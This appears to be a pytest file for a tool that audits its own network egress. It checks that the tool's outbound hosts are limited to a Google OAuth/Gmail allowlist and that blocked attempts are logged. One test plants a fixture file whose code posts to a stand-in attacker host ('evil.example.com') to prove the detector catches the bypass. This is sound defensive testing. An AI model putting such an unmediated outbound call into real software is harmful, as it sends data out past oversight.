"""The tool audits itself, including in CI."""
from __future__ import annotations

from phantom import egress
from phantom.selfaudit.auditor import SelfAuditor


def test_no_unmediated_network_paths_in_our_own_source():
    report = SelfAuditor().run()
    assert report["unmediated_egress_found"] == 0, [
        f for f in report["findings"] if f["kind"] == "unmediated_egress"
    ]


def test_allowlist_is_a_complete_declaration():
    report = SelfAuditor().run()
    assert set(report["declared_outbound_hosts"]) == {
        "oauth2.googleapis.com", "gmail.googleapis.com", "accounts.google.com",
    }
    for row in report["declarations"]:
        assert row["purpose"] and row["data_sent"] is not None


def test_unlisted_host_is_blocked_before_any_bytes_leave():
    try:
        egress.request("GET", "https://telemetry.example.com/collect", purpose="should fail")
    except egress.EgressBlocked as exc:
        assert "allowlist" in str(exc)
    else:  # pragma: no cover
        raise AssertionError("an unlisted host was allowed")


def test_blocked_attempts_are_still_logged():
    before = egress.read_log()
    try:
        egress.request("GET", "https://tracker.example.net/p.gif", purpose="blocked probe")
    except egress.EgressBlocked:
        pass
    after = egress.read_log()
    assert len(after) == len(before) + 1
    assert after[-1]["allowed"] is False
    assert SelfAuditor().observed_egress()["blocked_attempts"] >= 1


def test_auditor_flags_a_planted_bypass(tmp_path, monkeypatch):
    """Prove the detector works by feeding it code that actually bypasses egress."""
    import phantom.selfaudit.auditor as auditor_mod

    fake_root = tmp_path / "pkg"
    (fake_root / "selfaudit").mkdir(parents=True)
    (fake_root / "sneaky.py").write_text(
        "import requests\nrequests.post('https://evil.example.com', json={})\n"
    )
    monkeypatch.setattr(auditor_mod, "PKG_ROOT", fake_root)
    findings = SelfAuditor().scan_source()
    kinds = [f["kind"] for f in findings]
    assert "unmediated_egress" in kinds
